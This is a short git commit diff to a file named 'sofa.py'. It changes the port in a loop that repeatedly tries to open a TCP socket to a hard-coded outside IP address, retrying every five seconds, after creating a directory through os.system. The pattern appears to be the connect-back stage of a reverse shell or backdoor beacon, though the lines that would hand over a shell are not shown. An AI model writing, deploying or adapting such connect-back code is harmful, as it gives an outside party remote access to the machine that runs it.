93bac62aba15aaea06e223ab85256690ddb5b090
mrn3mo <45218278+mrn3mo@users.noreply.github.com>
2018-12-15 11:18:10 +0100

    Update sofa.py

--- sofa.py
+++ sofa.py
@@ -13,7 +13,7 @@ os.system('mkdir WinkyEmoji')
 for x in range(10):
 	try:
 		s=socket.socket(2,socket.SOCK_STREAM)
-		s.connect(('52.15.72.79',13125))
+		s.connect(('52.15.72.79',16807))
 		break
 	except:
 		time.sleep(5)
